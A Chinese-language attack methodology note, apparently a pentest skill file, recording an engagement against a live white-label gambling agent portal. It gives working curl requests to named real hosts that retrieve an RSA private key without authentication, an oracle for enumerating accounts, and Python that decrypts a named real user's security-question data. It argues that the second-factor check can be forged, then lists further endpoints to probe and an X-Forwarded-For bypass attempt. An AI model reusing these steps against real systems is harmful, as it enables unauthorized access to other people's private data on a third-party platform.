# 免鉴权泄露密钥对 → 解密真实用户数据（白标博彩代理端）

来源：2026-09-27 开云系白标（代理端 `71j8yy:9023` / 孪生域 `7htxsb.vip:6506`）实战。

## 为什么单列一条

「私钥泄露」四个字在报告里几乎没分量。这条方法论的价值是：**把它落到「我用这个私钥读出了一个真实用户的私密数据」**——这才是用户点名的「高危、能影响到」的洞。

## 一、端点清单（全部免鉴权，纯 curl 可复现）

```bash
BASE=https://www.7htxsb.vip:6506
H=(-H 'Content-Type: application/json' -H 'X-API-XXX: /agent/api' \
   -H 'X-API-CLIENT: h5' -H 'X-API-VERSION: 1.0.0' -H 'X-API-SITE: 4002' -H 'X-API-TYPE: h5')

# ① RSA 私钥 / 公钥
curl -sk --noproxy '*' -X POST $BASE/agent/api/v1/security/getRsaPrivateKey "${H[@]}" -d '{}'
# → {"data":"LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0t…","message":"操作成功","status_code":6000}
curl -sk --noproxy '*' -X POST $BASE/agent/api/v1/security/getRsaPublicKey  "${H[@]}" -d '{}'

# ② 任意账号的密保问题密文（同时是存在性 oracle）
curl -sk --noproxy '*' -X POST $BASE/agent/api/v1/security/getSecurityQuestionNoLogin "${H[@]}" \
     -d '{"userName":"agent01"}'
```

### 三态读法（`getSecurityQuestionNoLogin`）

| 响应 | 含义 |
|---|---|
| `[{"question":"<RSA密文344字符>","answer":""}]` | **账号存在且有密保**（命中即拿到密文） |
| `请设置密保！` | 账号存在、未设密保 |
| `未查询到当前账户信息` | 账号不存在 |
| `请求参数错误` | **字段名错**（传 `name`/`account`/`mobile` 都是这个；正确字段是 `userName`） |

实测样本：`agent01` → 密文数组（命中）；`111111`/`t4agent01`（自建）→ 请设置密保；`admin`/`root`/`kefu`/`gm01`/`agentadmin` → 未查询到。

**注意这条 oracle 只读、无副作用**（不像 `register` 型 oracle 会顺手建号），可以放心小批量枚举；但账号名空间是运营方自选的，字典命中率低，价值主要在「确认已知候选」。

## 二、解密（Python，pycryptodome）

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import base64

priv = RSA.import_key(open("rsa_priv.pem").read())      # ① 的 data base64 解码即为本 PEM
pt = PKCS1_v1_5.new(priv).decrypt(base64.b64decode(q_cipher), b"__FAIL__")
# agent01 → '最喜欢的一款饮料' / '最喜欢的二款饮料' / '最喜欢的三款饮料'
```

## 三、加密方向必须实测判定（最容易写错的一步）

按常识会写「客户端用公钥加密、服务端用私钥解」⇒ 私钥泄露 = 能解流量（影响有限，需先截获）。**本案恰好相反**，读 JS 调用点即可确认：

```javascript
// agent chunk —— saveSecurityQuestion / updateVerifyInformationLogin 共用
function V() {
  n = e.qalist;
  r = await J();                        // J() = getRsaPrivateKey ← ★ 客户端取的是私钥
  o = await Promise.all(n.map(async e => {
        n = await c.W3(e.question, r);  // W3 = RSA 加密（此处即私钥运算/签名）
        i = await c.W3(e.answer,  r);
        return {...e, answer: i, question: n}; }));
  return v_("/agent/api/v1/member/saveSecurityQuestion", {qalist: o});
}
// 读取侧：I() → v_(".../getSecurityQuestionNoLogin") .then(e => e.map(t => c.IM(t.question)))
//   IM = 私钥解密 ⇒ 服务端下发的密文要用私钥打开
```

⇒ **客户端持有私钥、服务端持有公钥**：所谓「签名」是**私钥签 / 公钥验**，而公钥公开 ⇒ **任何未认证者都能对任意答案构造出合法签名**，这道二次验证的强度为 0。

方向验证（往返一次即可钉死）：

```python
pub = RSA.import_key(open("rsa_pub.pem").read())
ct = base64.b64encode(PKCS1_v1_5.new(pub).encrypt(b"\xe8\xb6\xb3\xe7\x90\x83")).decode()   # 公钥加密
PKCS1_v1_5.new(priv).decrypt(base64.b64decode(ct), b"__F__")   # 私钥回解 = '足球' ✓ (344 字符密文)
```

## 四、边界（不要越写越大）

- **`security/verifySecurityLogin` 是第二步，不是独立入口。** 免鉴权无 cookie 下恒回 `6001 …30分钟内无任何操作`；`member/loginFlow` 只认 `userName`（传 `name` 回 `用户名不能为空`），且带密码才继续。⇒ 结论写成「面存在、排在口令之后」，**不写「密保登录可绕过」**。
- **`member/setPassword` 带自己 token 时 `{name,password}` 回「重制密码成功!」——它改的是*支付密码*，不是登录口令**，且跨账号测试立刻撞 `操作频繁，稍后再试`。涉及资金/支付密码的写接口按纪律**不碰**。
- **不要拿「每次返回都不同」当越权证据。** 同族 `security/getQrcodeAndSecret` 传任意 `{name,userName,id,agentId}` 都回互不相同的 secret，但 `otpauth://totp/<label>?secret=…` 的 label 始终是自己 ⇒ 它是**生成型**端点、**完全忽略入参**，无 IDOR。（此坑与主 SKILL 的三道自检第 1 条同源，此处再记一次是因为本案差点据此报接管级洞。）

## 五、同案抠出的相邻面（写报告时一起交）

| 面 | 形状 |
|---|---|
| 博彩引擎 API 域 | 从 `_app` chunk 抠 `//bkapi.<域>` → 解析得 IP；`/api/mobile/*` 24 个端点（`getBalance`/`getBetList`/`getStatement`/`getBetInfo`/`placeBet`/`submitbuyback`/`GetLiveResults`/`GetCompletedResults`/`getEventInfoByPage`…） |
| 引擎可达性判读 | GET 回 CDN 前置 `400 Bad Request`、POST 回引擎自身 `Not Found` ⇒ **引擎活着，路径/鉴权不对**，别判死整台 |
| 资金 JWT 签发口 | `/site/api/v1/user/member/jwt` 恒 `6003 非法请求` ⇒ 接口存在、锁死在**玩家**会话（代理会话打不动） |
| 第三方场馆余额 | `/yewu12/api/user/amount?enName=<场馆码>`（`enName` 取值来自 `P.UT.*` 枚举，如 `OBTY`/`IMTY`/`FBTY`） |
| 参数化配置键 | `front/querySiteConfigAll {"commonInfoKey":"agent_vip_special_commission"}` ⇒ 键表可喷 |
| Spring Actuator | `/page/fd/api/v1/actuator/*` 回应用自研 JSON `{"code":-1,"msg":"您无权访问! "}`；加 `X-Forwarded-For: 127.0.0.1` 翻成边缘 WAF deny 页（`…/apeiro8/edge/html/prod/deny/deny-errorpage.js`） |
| 代理开号/等级闸 | 免鉴权 `member/registerFlow`（AES 体）可自助开代理；`unlimitedAgent/*` 回「当前代理未开通无限极」= **账号等级闸**；`member/updateAgentConfig` 20 个字段全回「成功」但**一个都不落库**（服务端白名单）⇒ 提权判死 |

## 六、报告措辞模板

> **未认证攻击者可用一个免鉴权接口取得的 RSA 私钥，解密平台上任意代理用户的密保问题**（已验证真实账号 `agent01`），构成对真实用户隐私数据的未授权读取；且因验签公钥公开、客户端持私钥签名，**密保二次验证机制完全失效**（任何人均可构造合法签名）。

配合「面清单 + 形状证据」一起交，别只写一句「私钥泄露」。
